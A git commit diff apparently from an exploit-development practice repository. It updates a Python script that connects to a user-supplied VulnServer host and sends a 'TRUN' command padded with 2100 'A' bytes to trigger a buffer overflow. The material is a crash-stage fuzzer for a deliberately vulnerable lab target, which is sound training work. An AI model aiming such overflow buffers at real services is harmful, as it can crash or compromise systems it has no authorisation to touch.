820fdbc734129d37240df0b5664669df7d044c3c
Hrishi Ghosalkar <87890571+rookie-cookie-8@users.noreply.github.com>
2024-09-25 13:32:01 +0530

    Update fuzzing-2.py

--- fuzzing-2.py
+++ fuzzing-2.py
@@ -1,30 +1,31 @@
-#!/usr/bin/python3
+#!/usr/bin/python3 
+
 import sys,socket
-from time import sleep
+import time
 
-print("************VulnServer TRUN**********")
+print("*****VulnServer*****")
+ip_address=input("Enter the IP address:\n")
+port=input("Enter the port number:\n")
 
-ip_address=input("Enter the IP address\n")
-port_number=input("Enter the port number\n")
 
-if (len(ip_address)<=0) or (len(port_number)<=0):
-    if (len(ip_address)>0) and (len(port_number)<=0):
-        print("*" * 30)
+if (len(ip_address)==0) or (len(port)==0):
+    if (len(ip_address)>0) and (len(port)==0):
+        print("*"*40)
         print("Port number field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)>0):
-        print("*" * 30)
-        print("IP Address field is empty")
-    elif (len(ip_address)<=0) and (len(port_number)<=0):
-        print("*" * 30)
-        print("IP Address field is empty")
+    elif (len(ip_address)==0) and (len(port)>0):
+        print("*"*40)
+        print("IP address field is empty")
+    elif (len(ip_address)==0) and (len(port)==0):
+        print("*"*40)
+        print("IP address field is empty")
         print("Port number field is empty")
     else:
-        print("*" * 30)
+        print("*"*40)
         print("Issues with the user input")
-else:
-    size=2100
+
+elif (len(ip_address)>0) and (len(port)>0):
+    buffer=2100
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect((ip_address, int(port_number)))
-    print(f"Sending buffer --> {size}")
-    s.send(b"TRUN /.:/" + b"A"*size)
-    s.close()
+    s.connect((ip_address,int(port)))
+    print(f"Sending buffer --> {buffer}")
+    s.send(b"TRUN /.:/ " + b"A" *buffer)
